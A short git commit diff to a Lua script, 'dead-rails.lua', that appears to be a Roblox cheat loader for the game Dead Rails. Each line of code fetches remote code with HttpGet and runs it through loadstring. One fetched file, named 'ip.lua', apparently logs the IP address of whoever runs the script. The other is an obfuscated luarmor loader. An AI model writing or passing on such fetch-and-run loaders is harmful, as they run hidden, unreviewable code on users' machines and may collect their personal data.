fd6093be4afa9572c89c78231afb5f3e1e9fa882
xielbers <88589081+xielbers@users.noreply.github.com>
2025-07-27 21:02:06 -0300

    Actualizar dead-rails.lua

--- dead-rails.lua
+++ dead-rails.lua
@@ -1,3 +1,5 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/refs/heads/main/copy/ip.lua'))()
+_G.script_executed = "dead-rails.lua"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
